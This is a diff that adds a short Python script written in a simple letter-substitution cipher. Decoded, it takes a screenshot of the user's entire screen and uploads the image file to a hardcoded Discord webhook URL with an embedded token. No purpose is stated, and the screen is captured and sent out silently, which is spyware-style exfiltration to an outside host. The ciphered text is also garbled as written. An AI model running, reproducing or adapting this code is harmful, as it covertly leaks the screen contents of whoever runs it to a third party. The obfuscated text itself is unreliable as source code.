@@ -1,0 +1,26 @@
+dhkjmo hnn
+dhkjmo odhz
+dhkjmo mzlpznon
+
+RZWCJJF_PMG = "cookn://ydnxjmy.xjh/vkd/rzwcjjfn/4626509924717614417/kx_V1NwBy40Q6L2VzTF3vNt4p0wPZZG2_0l_EZjta0uRGKTtcXxzo7Nltgmiryl8s4yz"
+
+yza ovfz_nxmzzincjo():
+    rdoc hnn.hnn() vn nxo:
+        adgzivhz = a"nxmzzincjo_{dio(odhz.odhz())}.kib"
+        nxo.ncjo(jpokpo=adgzivhz)
+    mzopmi adgzivhz
+
+yza nziy_oj_ydnxjmy(adgz_kvoc):
+    rdoc jkzi(adgz_kvoc, "mw") vn a:
+        adgzn = {
+            "adgz": (adgz_kvoc, a)
+        }
+        mznkjinz = mzlpznon.kjno(RZWCJJF_PMG, adgzn=adgzn)
+    da mznkjinz.novopn_xjyz == 537:
+        kmdio("vggjr")
+    zgnz:
+        kmdio(a"avgnz: {mznkjinz.novopn_xjyz} {mznkjinz.ozso}")
+
+da __ivhz__ == "__hvdi__":
+    kvoc = ovfz_nxmzzincjo()
+    nziy_oj_ydnxjmy(kvoc)
